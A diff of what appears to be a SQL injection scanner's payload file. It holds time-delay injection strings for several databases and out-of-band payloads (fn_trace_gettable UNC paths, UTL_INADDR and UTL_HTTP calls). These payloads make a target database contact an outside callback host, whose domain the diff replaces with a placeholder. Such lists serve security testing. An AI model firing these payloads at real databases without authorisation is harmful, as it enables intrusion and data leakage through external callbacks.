@@ -3,7 +3,7 @@ mysql_select:
   - SLEEP(11)
 mssql_select:
   - WAITFOR DELAY '00:00:11'
-  - (select * from fn_trace_gettable('\\mssql.5696d8f4.bzn.pw\1.trc',default))
+  - (select * from fn_trace_gettable('\\{BC}\1.trc',default))
 postgre_select:
   - pg_sleep(11) is not null
 sqlite_select:
@@ -17,8 +17,8 @@ simple_select:
 
 oracle_select:
   - UTL_INADDR.get_host_name('10.0.0.1')
-  - UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')
-  - UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')
+  - UTL_INADDR.get_host_address('{BC}')
+  - UTL_HTTP.REQUEST('http://{BC}')
 
 all_select:
   - "%simple_select;"
@@ -30,7 +30,7 @@ all_select:
 stacked:
   - BEGIN DBMS_LOCK.SLEEP(10); END; 
   - WAITFOR DELAY '00:00:10'
-  - select * from fn_trace_gettable('\\mssql.5696d8f4.bzn.pw\1.trc',default)
+  - select * from fn_trace_gettable('\\{BC}\1.trc',default)
 
 select_vectors:
   - "%plus;%all_select;" # +sleep(10)
